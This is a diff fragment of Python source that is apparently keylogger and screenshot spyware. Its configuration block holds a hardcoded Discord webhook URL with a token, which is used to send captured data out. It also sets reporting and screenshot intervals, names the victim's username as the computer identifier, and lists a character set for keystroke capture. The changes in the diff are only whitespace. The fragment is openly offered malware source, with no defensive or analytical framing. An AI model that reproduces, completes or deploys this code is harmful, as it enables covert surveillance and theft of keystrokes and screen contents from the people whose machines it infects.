@@ -6,9 +6,11 @@ import os
 import PIL.ImageGrab
 from io import BytesIO
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/1212496091015159809/NglEdKo1KOnsdgBURtnjOc5uYf7Bch8VShuCceECKLtJK7TbWsvhWTzi0oofaLysuezz'  # Your Discord Webhook URL
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1212496091015159809/NglEdKo1KOnsdgBURtnjOc5uYf7Bch8VShuCceECKLtJK7TbWsvhWTzi0oofaLysuezz'# Your Discord Webhook URL
+
 MESSAGE_INTERVAL = 10  # Amount of time between each report, expressed in seconds.
 IMAGE_INTERVAL = 5  # Amount of time between each screenshot, expressed in seconds.
+
 COMPUTER_NAME = os.getenv("USERNAME") # victim pc name
 
 char_list = ["a", "ą", "b", "c", "ć", "d", "e", "ę", "f", "g", "h", "i", "j", "k", "l", "m", "n", "ń", "o", "ó", "p", "q", "r", "s", "ś", "t", "u", "v", "w", "x", "y", "z", "ż","ź", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
